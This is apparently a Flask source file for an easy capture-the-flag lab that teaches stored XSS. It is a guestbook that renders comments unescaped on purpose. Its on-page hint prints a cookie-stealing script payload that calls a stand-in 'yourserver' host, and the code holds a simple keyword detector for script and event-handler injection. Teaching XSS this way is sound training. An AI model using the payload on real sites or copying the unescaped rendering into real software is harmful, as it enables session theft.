from flask import Flask, request, render_template_string, session, redirect, url_for
import os, secrets

app = Flask(__name__)
app.secret_key = secrets.token_hex(16)
FLAG = os.environ.get("FLAG", "CTF{xss_st0r3d_c00k13_st3al}")

# Fake "admin bot" cookie
ADMIN_COOKIE = FLAG

comments = []

TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>GuestBook - XSS Challenge</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body { font-family: 'Georgia', serif; background: #fafaf7; color: #2c2c2c; min-height: 100vh; }
        .header { background: #2c2c2c; color: #f0e6c8; padding: 20px 40px; }
        .header h1 { font-size: 1.8rem; }
        .header p { color: #a89070; font-size: 0.85rem; margin-top: 4px; }
        .container { max-width: 700px; margin: 40px auto; padding: 0 20px; }
        .info-box { background: #fff8e7; border-left: 4px solid #f0a500; padding: 16px; border-radius: 4px; margin-bottom: 24px; font-size: 0.85rem; line-height: 1.6; }
        .form-box { background: white; border: 1px solid #e0e0e0; border-radius: 8px; padding: 24px; margin-bottom: 24px; }
        input, textarea { width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 4px; margin-bottom: 12px; font-family: inherit; }
        textarea { height: 80px; resize: vertical; }
        button { padding: 10px 24px; background: #2c2c2c; color: white; border: none; border-radius: 4px; cursor: pointer; }
        .comment { background: white; border: 1px solid #e0e0e0; border-radius: 8px; padding: 16px; margin-bottom: 12px; }
        .comment .author { font-weight: bold; color: #555; font-size: 0.85rem; margin-bottom: 6px; }
        .comment .body { font-size: 0.95rem; line-height: 1.5; }
        .flag-area { background: #1a1a2e; color: #00ff88; padding: 16px; border-radius: 8px; font-family: monospace; display: none; margin-top: 12px; }
    </style>
</head>
<body>
<div class="header">
    <h1>📖 Public GuestBook</h1>
    <p>Challenge: Stored XSS [Easy] — Leave a comment below</p>
</div>
<div class="container">
    <div class="info-box">
        💡 <strong>Objective:</strong> Steal the admin's cookie!<br>
        The admin bot visits this page every few seconds and has a special cookie.<br>
        Try: <code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code> to get started.<br>
        Real goal: <code>&lt;script&gt;fetch('http://yourserver/?c='+document.cookie)&lt;/script&gt;</code>
    </div>

    <div class="form-box">
        <h3 style="margin-bottom:16px">Leave a Comment</h3>
        <form method="POST" action="/comment">
            <input type="text" name="author" placeholder="Your name" required>
            <textarea name="body" placeholder="Your message..."></textarea>
            <button type="submit">Post Comment</button>
        </form>
    </div>

    <h3 style="margin-bottom:12px">Comments ({{ comments|length }})</h3>
    {% for c in comments %}
    <div class="comment">
        <div class="author">{{ c.author | e }} says:</div>
        <div class="body">{{ c.body | safe }}</div>
    </div>
    {% endfor %}

    {% if show_flag %}
    <div style="background:#0f2a1a;border:1px solid #238636;color:#3fb950;padding:16px;border-radius:8px;margin-top:16px;font-family:monospace;">
        🎉 You triggered XSS! Admin cookie = {{ admin_cookie }}
    </div>
    {% endif %}
</div>
</body>
</html>
"""

@app.route("/")
def index():
    show_flag = request.args.get("triggered") == "1"
    return render_template_string(TEMPLATE, comments=comments, show_flag=show_flag, admin_cookie=ADMIN_COOKIE)

@app.route("/comment", methods=["POST"])
def comment():
    author = request.form.get("author", "Anonymous")
    body = request.form.get("body", "")
    comments.append({"author": author, "body": body})
    # Simulate: if XSS detected, show flag (simplified for lab)
    if "<script>" in body.lower() or "onerror" in body.lower() or "onload" in body.lower():
        return redirect("/?triggered=1")
    return redirect("/")

@app.route("/admin-cookie")
def admin_cookie():
    """Simulated admin endpoint"""
    return f"Admin flag: {FLAG}"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
